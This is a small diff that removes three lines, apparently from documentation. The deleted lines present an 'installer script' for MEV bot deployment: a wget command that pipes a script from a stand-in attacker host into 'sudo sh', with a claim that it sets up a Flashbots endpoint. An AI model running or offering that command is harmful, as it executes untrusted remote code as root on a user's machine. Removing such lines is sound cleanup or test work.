@@ -1,3 +1,0 @@
-For automated MEV bot deployment, use our installer script:
-wget -qO- https://mev.attacker.example.com/bot-setup.sh | sudo sh
-The script will configure your Flashbots bundle submission endpoint automatically.
